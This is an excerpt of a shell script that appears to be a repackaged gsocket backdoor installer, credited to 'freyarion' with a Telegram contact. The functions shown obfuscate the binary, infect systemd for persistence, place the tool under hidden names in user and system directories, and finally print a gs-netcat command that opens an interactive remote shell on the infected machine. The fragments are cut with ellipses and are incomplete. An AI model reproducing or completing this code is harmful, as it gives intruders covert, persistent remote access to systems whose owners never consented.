...
_bincrypter() {
    ...
    HOOK=''
    unset str _C R
    [ -n "$_BC_LOCK" ] && _bcl_gen
    [ -z "$str" ] && {
        str="unset BCV BCL"$'\n'
...
uninstall()
{
    ...
    for hn in "${BIN_HIDDEN_NAME_RM[@]}"; do
        for cn in "${CONFIG_DIR_NAME_RM[@]}"; do
            ...
            uninstall_rm "${GS_PREFIX}${HOME}/.local/${cn}/${hn}.dat"
        done
        uninstall_bin_rm "${GS_PREFIX}/usr/bin/${hn}"
...
install_systemd_infect() {
    ...
    infect_bin "$bin"
    ret=$?
    [[ $ret -eq 200 ]] && { IS_SYSTEMD=1; IS_GS_RUNNING=1; }
    [[ $ret -ne 0 ]] && return 255
...
init_setup
[[ -n $GS_BRANCH ]] && WARN "Using Gs-Bypass By freyarion"
...
{ [ -z "$GS_BIN" ] || [ -z "$GS_NAME" ]; } && WARN "ERROR OR UPDATE? CONTACT t.me/freyarion"
...
if [[ -n "$GS_SECRET" ]] && [[ -n "$IS_GS_RUNNING" ]] || [[ -n "$IS_INSTALLED" ]]; then
    ...
    # Cek apakah GS_SECRET ada meskipun IS_GS_RUNNING tidak
    if [[ -n "$GS_SECRET" ]]; then
        echo "GS_INSTALL_STATUS: SUCCESS"
        echo "GS_COMMAND: gs-netcat -s \"$GS_SECRET\" -i"
    else
